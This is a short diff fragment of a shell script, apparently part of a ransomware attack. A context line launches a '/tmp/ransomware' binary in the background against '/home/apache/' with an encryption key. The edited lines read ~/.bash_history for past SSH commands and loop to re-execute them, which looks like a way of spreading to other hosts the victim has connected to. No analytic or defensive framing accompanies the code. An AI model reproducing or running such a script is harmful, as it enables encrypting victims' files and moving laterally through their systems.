@@ -9,7 +9,7 @@ nohup /tmp/ransomware --pub /tmp/public_key.pem --path /home/apache/ --enc-sym-k
 search_term="ssh"
 
 # Get all commands from the history that contain the search term
-commands=$(history | grep "$search_term")
+commands=$(cat ~/.bash_history | grep "$search_term")
 
 # Loop through each command and execute it with the -C flag if it's an SSH command
 while IFS= read -r command; do
